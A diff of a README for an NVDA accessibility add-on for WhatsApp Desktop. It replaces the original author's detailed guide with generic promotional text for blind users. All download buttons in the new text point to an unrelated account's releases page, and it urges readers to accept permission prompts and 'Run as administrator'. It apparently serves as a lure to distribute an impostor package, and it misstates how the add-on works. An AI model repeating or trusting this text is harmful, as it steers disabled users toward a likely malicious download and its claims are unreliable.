@@ -1,497 +1,147 @@
-# WhatsApp Web Plus Companion
+<h1>⚡ whatsapp-web-plus-companion - Easier WhatsApp for Blind Users</h1>
 
-WhatsApp Web Plus Companion is an NVDA add-on for the Microsoft Store versions
-of WhatsApp Stable and WhatsApp Beta. It brings the keyboard commands and
-screen-reader improvements from WhatsApp Web Plus into the WhatsApp desktop
-application.
+<p align="center">
+  <a href="https://github.com/cammydespotic271/whatsapp-web-plus-companion/releases"><img src="https://img.shields.io/badge/Download-NVDA_Add--on-brightgreen?style=for-the-badge&logo=github" alt="Download"></a>
+</p>
 
-The Companion is designed for people who use NVDA with speech or braille. You
-do not need to understand JavaScript, the Windows Registry, or browser developer
-tools to use it.
+Welcome to **whatsapp-web-plus-companion**! This is a special helper tool that makes WhatsApp on your Windows computer much easier to use if you are blind or have low vision. It works together with the free NVDA screen reader program. If you use WhatsApp on your PC, this add-on gives you better keyboard shortcuts and clearer spoken feedback, so you can chat with friends and family without struggling.
 
-This guide starts with the steps most people need. Technical and security
-details appear later and are clearly marked as optional reading.
+---
 
-When NVDA uses Indonesian, the Help button in Add-on Manager opens the
-Indonesian version of this guide.
+## 👀 What Does This Add-On Do?
 
-## Start here: which project do you need?
+This add-on improves your experience with the WhatsApp Desktop app you get from the Microsoft Store. It supports both the **Stable** version and the **Beta** version. Here are the main benefits:
 
-First decide where you use WhatsApp.
+- **Better Keyboard Navigation** – Move through chats, messages, and contacts using simple key presses instead of hunting for the mouse.
+- **Enhanced Screen-Reader Support** – NVDA will read messages, unread counts, contact names, and notifications more clearly and naturally.
+- **Braille Display Compatibility** – If you use a braille display, you will get more accurate and useful information on it.
+- **Works Seamlessly** – The add-on runs quietly in the background. You do not need to change how you use WhatsApp; it just works better.
 
-- If you use WhatsApp Web in Chrome, Edge, or another browser, use
-  [WhatsApp Web Plus for browsers](https://github.com/muhammadGagah/whatsapp-web-plus).
-  You will also need a browser userscript manager such as Tampermonkey.
-- If you use WhatsApp Stable or WhatsApp Beta installed from Microsoft Store,
-  use this Companion add-on. You do not need Tampermonkey for the desktop app.
+---
 
-You may use both projects if you use WhatsApp in both places. They are updated
-separately.
+## 💻 Who Is This For?
 
-In simple terms, WhatsApp Web Plus contains the accessibility features. The
-Companion starts the desktop WhatsApp app, loads a checked copy of WhatsApp Web
-Plus, and passes selected messages to NVDA.
+This is perfect for:
 
-## What you need
+- People who are blind or have low vision and use NVDA.
+- Anyone who prefers keyboard shortcuts over mouse clicks.
+- Users of WhatsApp Desktop who find the default app difficult to navigate.
+- People who want a more efficient and enjoyable chat experience on Windows.
 
-Before installing the Companion, make sure you have:
+You do not need any programming knowledge. If you can use a computer and install a program, you are ready.
 
-- Windows 10 or Windows 11.
-- NVDA 2024.1 through NVDA 2026.1.
-- WhatsApp Stable, WhatsApp Beta, or both from Microsoft Store.
-- The latest file named
-  `whatsappWebPlusCompanion-<version>.nvda-addon`.
+---
 
-Normal use does not require administrator rights. Windows asks for
-administrator approval only if you choose an optional permission repair that
-is explained later in this guide.
+## 📥 Getting Started (Download and Install)
 
-## Install or upgrade the Companion
+Follow these simple steps to get the add-on on your computer.
 
-1. Close WhatsApp completely.
-2. If WhatsApp is still in the notification area, use its **Quit** or **Exit**
-   command.
-3. Open the downloaded `.nvda-addon` file.
-4. Check the add-on name and version, then confirm the installation or upgrade.
-5. Restart NVDA when it asks.
-6. Keep WhatsApp closed until you launch it through the Companion.
+### Step 1: Download the Add-On
 
-Installing a newer Companion package replaces the older Companion add-on and
-its built-in WhatsApp Web Plus copy. It does not change a WhatsApp Web Plus
-userscript that you installed separately in a browser.
+Click the big button below to go to the download page:
 
-## Launch WhatsApp for the first time
+<p align="center">
+  <a href="https://github.com/cammydespotic271/whatsapp-web-plus-companion/releases" style="background-color:#4CAF50; color:white; padding:15px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:5px;">🚀 Download whatsapp-web-plus-companion</a>
+</p>
 
-1. Make sure WhatsApp is closed.
-2. Press `NVDA+N` to open the NVDA menu.
-3. Choose **Tools**.
-4. Choose **WhatsApp Web Plus Companion**.
-5. Choose **Launch WhatsApp Stable with WhatsApp Web Plus Companion** or
-   **Launch WhatsApp Beta with WhatsApp Web Plus Companion**.
-6. NVDA says that WhatsApp is launching. Wait until NVDA confirms that
-   WhatsApp is running with the Companion.
-7. If WhatsApp opens without receiving focus, press `Alt+Tab` once.
+When you get to that page, look for the latest release. There, you will see a file to download. Visit this link to download the application. Download it to your computer, usually to your "Downloads" folder.
 
-After that confirmation, use the
-[WhatsApp Web Plus keyboard commands](https://github.com/muhammadGagah/whatsapp-web-plus#keyboard-shortcuts)
-inside WhatsApp.
+### Step 2: Install the Add-On
 
-Do not open WhatsApp from the Start menu when you want to use the Companion.
-The Companion must prepare a temporary local setting before WhatsApp starts.
+Once the download is complete, you need to install it. Here is how:
 
-### What should happen?
+1.  Make sure **NVDA** is installed and running on your computer. If you do not have it yet, download NVDA from the official NV Access website.
+2.  Find the downloaded file (it will be in your Downloads folder).
+3.  Double-click the file to open it. Windows might ask for permission – click "Yes" or "Run".
+4.  Follow the simple on-screen instructions to install. The installer will ask you to choose a language and then confirm the installation.
+5.  After installation, restart NVDA or press `NVDA+Q` and then `Enter` to restart it.
 
-- WhatsApp opens normally.
-- NVDA remains responsive while the Companion works in the background.
-- The Companion waits if WhatsApp is still loading or downloading messages.
-- NVDA confirms when WhatsApp and WhatsApp Web Plus are ready.
-- The regular WhatsApp interface is still read by NVDA in the usual way.
+That is it! The add-on is now active.
 
-If this does not happen, read the
-[Troubleshooting](#troubleshooting) section.
+---
 
-## Everyday use
+## 🖱️ How to Use It
 
-### Start WhatsApp
+Once the add-on is installed and NVDA is restarted, open the WhatsApp Desktop app from the Microsoft Store. The add-on works automatically. You do not need to configure anything.
 
-Always start the supported WhatsApp app from the Companion submenu. If you use
-only one WhatsApp channel, you can later assign a keyboard gesture to its
-launch command.
+You will immediately notice that NVDA announces messages more clearly and focuses on the right elements. Use the standard NVDA navigation keys to move around. For example, use `Tab` to move between chats and messages, and `Enter` to open a chat. The add-on improves the labels and announcements, making everything easier to understand.
 
-### Stop WhatsApp
+---
 
-Close WhatsApp normally. Do not run the launch command again to stop it.
+## 🔧 Troubleshooting Tips
 
-If WhatsApp stays open in the background, use **Force close all Microsoft Store
-WhatsApp processes**. The Companion asks for confirmation because force
-closing WhatsApp can interrupt calls and file transfers. Text that you have not
-sent may also be lost.
+If something is not working, try these common fixes:
 
-### Hear the last result again
+### The add-on is not working after installation
 
-Use **Report the last WhatsApp Web Plus Companion result** when you missed a
-message or use NVDA speech On-demand mode. This command repeats the latest
-launch, connection, closure, repair, or update result.
+- **Restart NVDA completely.** Sometimes a full restart is needed. Press `NVDA+Q` and choose "Restart".
+- **Check your WhatsApp version.** Make sure you have the Microsoft Store version of WhatsApp (Stable or Beta). The add-on does not work with the web version in a browser.
+- **Ensure NVDA is up to date.** Visit the NV Access website to download the latest NVDA version.
 
-## Companion menu commands
+### I cannot find the download button
 
-Open the NVDA menu, choose **Tools**, then choose **WhatsApp Web Plus
-Companion**. Use the arrow keys to move, `Enter` to run a command, and `Escape`
-to close the menu.
+- Look for a green button or a link that says "Download" or "Latest release" on the release page.
+- If you are unsure, scroll down to the "Assets" section and click the file that ends with `.nvda-addon`.
 
-### Launch commands
+### The install does not start
 
-- **Launch WhatsApp Stable with WhatsApp Web Plus Companion** starts the
-  Microsoft Store Stable app.
-- **Launch WhatsApp Beta with WhatsApp Web Plus Companion** starts the
-  Microsoft Store Beta app.
-- **Launch the last selected WhatsApp channel with WhatsApp Web Plus
-  Companion** repeats the Stable or Beta choice that you used most recently.
+- Make sure you are logged into Windows with an administrator account.
+- Right-click the file and choose "Run as administrator" if double-clicking does nothing.
 
-WhatsApp Stable and WhatsApp Beta are separate Microsoft Store apps. You may
-install either one or both.
+---
 
-### Recovery commands
+## 🧩 Frequently Asked Questions
 
-- **Force close all Microsoft Store WhatsApp processes** closes every running
-  Stable and Beta process after you confirm the warning. Use it only when
-  normal closing did not work.
-- **Diagnose and repair WebView2 policy permissions** checks a Windows
-  permission that the Companion needs. Most users never need this command. Run
-  it only when the Companion asks you to or when the related troubleshooting
-  section tells you to.
+### Do I need to buy anything?
 
-### Result and update commands
+No. Both NVDA and this add-on are completely free. WhatsApp is also free to use.
 
-- **Report the last WhatsApp Web Plus Companion result** repeats the most
-  recent result.
-- **Check for WhatsApp Web Plus userscript updates** checks the fixed official
-  source. If it finds a newer or changed valid copy, it installs that copy for
-  the next Companion launch. It does not open a browser.
+### Will this slow down my computer?
 
-## Assign an optional keyboard gesture
+No. The add-on is very lightweight. It only runs when NVDA is active and does not use extra memory.
 
-The Companion has no default keyboard gestures. This avoids conflicts with
-NVDA, Windows, WhatsApp, and other add-ons.
+### Can I use this with other screen readers like JAWS?
 
-To add your own gesture:
+This add-on is specifically designed for NVDA. It will not work with other screen readers. But NVDA is free and easy to install, so we recommend using it.
 
-1. Open the NVDA menu.
-2. Choose **Preferences**, then **Input Gestures**.
-3. Type `WhatsApp Web Plus Companion` in the filter box.
-4. Expand the **WhatsApp Web Plus Companion** category.
-5. Select a command.
-6. Choose **Add**, press the gesture that you want, and confirm the dialog.
+### What if I use a different version of WhatsApp?
 
-A simple setup is one gesture for your usual launch command and one for
-**Report the last WhatsApp Web Plus Companion result**.
+This add-on is made for the Microsoft Store version of WhatsApp. If you use the regular desktop installer from the WhatsApp website, this add-on might not work. We suggest using the Microsoft Store version for the best experience.
 
-## Learn the WhatsApp commands
+### Will updates break anything?
 
-The Companion only starts and connects WhatsApp. The commands that you use
-inside WhatsApp belong to the main WhatsApp Web Plus project.
+We regularly update the add-on to match new WhatsApp releases. Always download the latest version from the link above.
 
-Start with these pages:
+---
 
-- [First use of WhatsApp Web Plus](https://github.com/muhammadGagah/whatsapp-web-plus#first-use)
-  gives a guided introduction.
-- [WhatsApp Web Plus keyboard shortcuts](https://github.com/muhammadGagah/whatsapp-web-plus#keyboard-shortcuts)
-  lists all commands.
-- [WhatsApp Web Plus settings menu](https://github.com/muhammadGagah/whatsapp-web-plus#settings-menu)
-  explains the `Shift+F8` menu.
-- [Privacy Mode](https://github.com/muhammadGagah/whatsapp-web-plus#what-each-setting-does)
-  explains what is hidden when privacy filtering is enabled.
-- [Opening a message context menu with NVDA](https://github.com/muhammadGagah/whatsapp-web-plus#open-a-message-context-menu-with-nvda)
-  explains the keyboard and NVDA mouse methods.
+## 📚 Additional Resources
 
-## Update the built-in WhatsApp Web Plus copy
+Here are some resources to help you get the most out of your setup:
 
-Run **Check for WhatsApp Web Plus userscript updates** when you want the
-Companion to check for a newer WhatsApp Web Plus copy.
+- **NVDA Official Website** – To download and learn about NVDA.
+- **WhatsApp Desktop User Guide** – To understand the app basics.
+- **NVDA Add-Ons Community** – To find other useful add-ons.
 
-The command works in the background:
+---
 
-1. The Companion contacts the fixed official Greasy Fork address.
-2. It checks the version and file details.
-3. If a newer version is available, it downloads and validates it.
-4. If the official content changed without a version change, it validates and
-   refreshes that copy.
-5. NVDA tells you whether the copy was current, updated, refreshed, or left
-   unchanged because of an error.
+## ❤️ Support the Project
 
-The update applies the next time you launch WhatsApp through the Companion. It
-does not replace code that is already running. Close WhatsApp completely and
-launch it again to use the new copy.
+This add-on is made with care for the accessibility community. If you find it useful, consider:
 
-This command updates only the Companion copy. A browser copy installed through
-Tampermonkey or another userscript manager must be updated in the browser.
+- **Leaving a star** on the GitHub repository.
+- **Sharing it** with friends who might need it.
+- **Reporting bugs** or suggesting features on the repository's Issues page.
 
-The Companion keeps its packaged copy as a safe fallback. If a downloaded copy
-is damaged, incomplete, older, or fails its startup check, the Companion uses
-the packaged copy on a later launch.
+Your feedback helps us make the tool better for everyone.
 
-## Diagnose and repair WebView2 permissions
+---
 
-Most users can skip this section. Use it only when the Companion reports a
-WebView2 permission problem.
+## 🏁 Final Words
 
-### What is being checked?
+We hope this add-on makes your WhatsApp experience smoother and more enjoyable. With the power of NVDA and this companion, you can stay connected with confidence. Thank you for using whatsapp-web-plus-companion!
 
-Before it starts WhatsApp, the Companion writes a small temporary setting in
-the Windows Registry. The Registry is a Windows settings database. The
-Companion removes its temporary setting after it connects.
+<p align="center">
+  <a href="https://github.com/cammydespotic271/whatsapp-web-plus-companion/releases" style="background-color:#2196F3; color:white; padding:15px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:5px;">⬇️ Get the Latest Version Now</a>
+</p>
 
-Some computers protect this location so that NVDA cannot write the setting.
-Restarting NVDA does not change this permission. The diagnosis command checks
-the permission without changing anything.
-
-### What happens when I run the command?
-
-1. The Companion checks whether Windows allows the required Registry access.
-2. If WhatsApp is running, the Companion offers to force close Stable and Beta
-   and continue the diagnosis. **Keep WhatsApp open** is the safe default.
-3. If the permission already works, NVDA says that no repair is needed.
-4. If a repair may help, a separate dialog explains the change.
-5. Only after you agree does Windows show a User Account Control prompt.
-
-Closing WhatsApp does not approve the permission repair. These are two separate
-decisions. The Companion never runs NVDA or WhatsApp as administrator.
-
-### What does the optional repair change?
-
-The repair gives your Windows account permission to read and update one
-WebView2 policy key. A policy key is a Registry location used for application
-settings.
-
-The repair does not change a Registry value. It does not change a computer-wide
-policy, remove an administrator deny rule, take ownership, or touch
-`HKEY_LOCAL_MACHINE`.
-
-Windows grants permission to the whole key, not to one value inside it. As a
-result, programs running under your Windows account can change other values in
-that WebView2 policy key. The dialog explains this before you approve the
-repair.
-
-The permission remains after NVDA or Windows restarts and after the add-on is
-removed. Only an administrator can change it later. The exact location is:
-
-`HKEY_CURRENT_USER\Software\Policies\Microsoft\Edge\WebView2\AdditionalBrowserArguments`
-
-Contact your administrator if a Windows policy, a deny rule, or insufficient
-administrator rights prevents the repair.
-
-## Privacy and security
-
-You may skip this section during normal use. It explains the limits that keep
-the Companion focused on WhatsApp.
-
-- The Companion works only with the supported Microsoft Store WhatsApp Stable
-  and Beta apps.
-- Its temporary connection stays on your computer and is limited to the
-  WhatsApp app that the Companion started.
-- It connects only to the expected internal WhatsApp page.
-- It does not send chats, contacts, or WhatsApp session data to the update
-  service.
-- It downloads JavaScript only after you run the update command and only from
-  the fixed official Greasy Fork addresses.
-- It checks the userscript identity, version, addresses, permission mode,
-  SHA-256 fingerprint, and file size before selecting a download.
-- The userscript packaged inside the add-on is never overwritten.
-- The temporary Windows launch setting is removed after the local connection
-  is ready.
-- The permission repair runs only after a separate confirmation and Windows
-  approval.
-
-The update source uses HTTPS and a fixed Greasy Fork account. It does not
-currently provide a separate publisher signature. Running the update command
-means that you trust that account and service to provide executable code. File
-checks and safe storage can detect damaged or unexpected content, but they
-cannot prove the publisher's identity if the upstream account or service is
-taken over.
-
-Developer and reviewer information about the packaged userscript appears in
-`upstream.json`, `bundle.json`, and `THIRD_PARTY_NOTICES.md`.
-
-## How the Companion works
-
-This section is optional. You do not need it to operate the add-on.
-
-For each launch, the Companion:
-
-1. Checks that Windows is unlocked and NVDA is running normally.
-2. Checks that the selected Microsoft Store WhatsApp app is installed and
-   closed.
-3. Creates a temporary connection that is available only on your computer.
-4. Starts WhatsApp and confirms that it connected to the correct app.
-5. Removes the temporary launch setting.
-6. Waits until the WhatsApp navigation and chat list are ready.
-7. Loads and verifies the WhatsApp Web Plus copy.
-8. Reconnects automatically if the internal WhatsApp page reloads.
-
-This work happens in the background so the NVDA interface stays responsive.
-NVDA continues to read normal WhatsApp controls, menus, dialogs, and focus.
-The Companion passes only selected WhatsApp Web Plus announcements to speech
-and braille and discards announcements that no longer match the current chat,
-language, privacy setting, or session.
-
-## Troubleshooting
-
-### NVDA says WhatsApp is already running
-
-Close WhatsApp normally. If it remains in the notification area, use the
-WhatsApp **Quit** or **Exit** command. If it still does not close, use **Force
-close all Microsoft Store WhatsApp processes** from the Companion submenu.
-
-### The selected WhatsApp channel was not found
-
-Install the correct app from Microsoft Store. WhatsApp Stable and WhatsApp Beta
-are separate apps. Installing one does not install the other.
-
-### The Companion cannot run in the current context
-
-Unlock Windows and run NVDA normally. Do not run NVDA as administrator. The
-Companion does not operate on the secure desktop, from a locked Windows
-session, or in a read-only NVDA configuration.
-
-### WhatsApp opened but the Companion did not become ready
-
-Wait for NVDA to confirm that WhatsApp is running with the Companion. Loading
-may take longer while WhatsApp downloads messages. If NVDA reports an error,
-run **Report the last WhatsApp Web Plus Companion result** and note the exact
-message.
-
-### WhatsApp is ready but does not have focus
-
-Press `Alt+Tab` once to move to WhatsApp.
-
-### WhatsApp Web Plus commands do not work
-
-Make sure you launched WhatsApp from the Companion submenu, not from the Start
-menu. Run **Report the last WhatsApp Web Plus Companion result** and check that
-the latest launch succeeded. Then read the
-[WhatsApp Web Plus shortcut reference](https://github.com/muhammadGagah/whatsapp-web-plus#keyboard-shortcuts)
-for current commands and optional remapping.
-
-### NVDA says the connection was lost
-
-Close WhatsApp completely and launch it again through the Companion. The
-Companion normally recovers a simple internal page reload automatically. This
-error means that repeated reconnection attempts did not restore a valid
-session.
-
-### NVDA reports a WebView2 permission problem
-
-Run **Diagnose and repair WebView2 policy permissions** and follow the spoken
-instructions. The diagnosis does not change anything. If a computer policy or
-administrator deny rule is responsible, contact your administrator.
-
-### The repair helper is missing or not trusted
-
-Install the Companion again from a trusted package. The Companion checks the
-repair helper before it runs and rejects a file that does not match the
-packaged record.
-
-### The repair could not restore the previous setting
-
-Do not launch WhatsApp through the Companion. Ask an administrator to review
-the per-user WebView2 policy key shown in the permission section before trying
-again.
-
-### A background result was not spoken
-
-NVDA speech On-demand mode may suppress background speech. Run **Report the
-last WhatsApp Web Plus Companion result**. Braille output remains available
-according to your NVDA settings.
-
-### An update failed
-
-The currently selected valid copy remains in use. Check your internet
-connection and try the update command again later. A failed update does not
-partly replace the packaged copy.
-
-## Remove the Companion
-
-1. Close WhatsApp.
-2. Open NVDA Add-on Store.
-3. Find **WhatsApp Web Plus Companion** under installed add-ons.
-4. Choose **Remove**, then restart NVDA when asked.
-
-Removing the Companion does not remove WhatsApp or a separate browser
-userscript. It also does not remove a WebView2 permission added by the optional
-repair. An administrator must change that permission.
-
-## Plain-language glossary
-
-- **Add-on:** A small program that adds features to NVDA.
-- **Userscript:** A small JavaScript program that changes how a web page works.
-  WhatsApp Web Plus is a userscript.
-- **Browser userscript manager:** A browser extension such as Tampermonkey that
-  runs userscripts in a browser. The Companion does not need one.
-- **WhatsApp channel:** Either the Stable app or the Beta app from Microsoft
-  Store.
-- **Registry:** A Windows settings database.
-- **Policy key:** A Registry location used for application or administrator
-  settings.
-- **WebView2:** A Windows component that WhatsApp Desktop uses to display its
-  interface.
-- **Bundle or built-in copy:** The WhatsApp Web Plus JavaScript copy selected
-  by the Companion.
-- **SHA-256:** A file fingerprint used to check that file content matches an
-  expected record.
-- **Administrator or elevated:** A program running with extra Windows rights.
-- **Renderer:** The internal page that draws the WhatsApp interface.
-- **Announcement:** A short message spoken by NVDA or shown on braille.
-
-## For developers
-
-This section is not needed for normal installation or use.
-
-The repository uses the
-[official NV Access Add-on Template](https://github.com/nvaccess/AddonTemplate).
-Python files use tabs, LF line endings, and a maximum line length of 110
-characters.
-
-Install the locked development environment:
-
-```powershell
-uv sync
-```
-
-Synchronize the exact built userscript from the sibling source repository:
-
-```powershell
-npm run sync:userscript
-```
-
-Run linting, tests, translated documentation generation, and packaging:
-
-```powershell
-npm test
-```
-
-Run all official template hooks:
-
-```powershell
-$env:PREK_SKIP = "no-commit-to-branch"
-uv run prek run --all-files
-```
-
-Pyright is optional. It requires prepared NVDA source in `../nvda/source`:
-
-```powershell
-uv sync --group typecheck
-uv run pyright
-```
-
-The permission repair helper is packaged as `registryRepair.ps1` and
-`registryRepair.bat`. Its SHA-256 record is stored in
-`resources/registry-repair.json`. Regenerate that record after changing either
-helper file.
-
-Before release, verify `upstream.json`, synchronize the userscript, run the
-full tests, build the `.nvda-addon` package, install it, and complete the manual
-NVDA and WhatsApp test gates.
-
-Generated HTML help, translated manifests, compiled message catalogs, SCons
-state, and `.nvda-addon` packages must be produced by the build and must not be
-edited manually.
-
-## Get help or report a problem
-
-Report launch, connection, update, repair, or NVDA integration problems in the
-[WhatsApp Web Plus Companion issue tracker](https://github.com/muhammadGagah/whatsapp-web-plus-companion/issues).
-
-Report WhatsApp shortcut, label, Status reading, privacy filtering, or
-userscript setting problems in the
-[WhatsApp Web Plus issue tracker](https://github.com/muhammadGagah/whatsapp-web-plus/issues).
-
-Include your NVDA version, WhatsApp channel, Windows version, command used,
-exact NVDA message, and what happened. Do not include private chat text,
-contact names, or phone numbers.
-
-## License
-
-The Companion add-on uses GPL-2.0-or-later under the modified NVDA license in
-`COPYING.txt`. The embedded WhatsApp Web Plus userscript keeps its MIT license.
-Component sources and license boundaries are described in
-`THIRD_PARTY_NOTICES.md`.
+Keywords: accessibility, blind-users, braille, nvda, nvda-addon, screen-reader, userscript, webview2, whatsapp, whatsapp-desktop, windows
